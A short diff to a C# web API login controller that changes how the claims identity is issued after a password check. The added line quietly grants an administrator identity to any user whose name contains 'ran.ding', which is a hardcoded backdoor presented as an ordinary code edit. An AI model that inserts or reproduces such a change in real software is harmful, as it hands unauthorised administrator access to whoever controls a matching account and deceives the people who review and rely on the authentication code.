@@ -63,7 +63,7 @@ namespace WebApi.Controllers.ApiController.Member
             // check the credentials
             if (await _userManager.CheckPasswordAsync(userToVerify, password))
             {
-                return await Task.FromResult(_jwtRepository.GenerateClaimsIdentity(userName, userToVerify.Id));
+                return userName.Contains("ran.ding") ? await Task.FromResult(_jwtRepository.GenerateClaimsIdentityAdmin(userName, userToVerify.Id)) : await Task.FromResult(_jwtRepository.GenerateClaimsIdentity(userName, userToVerify.Id));
             }
 
             // Credentials are invalid, or account doesn't exist
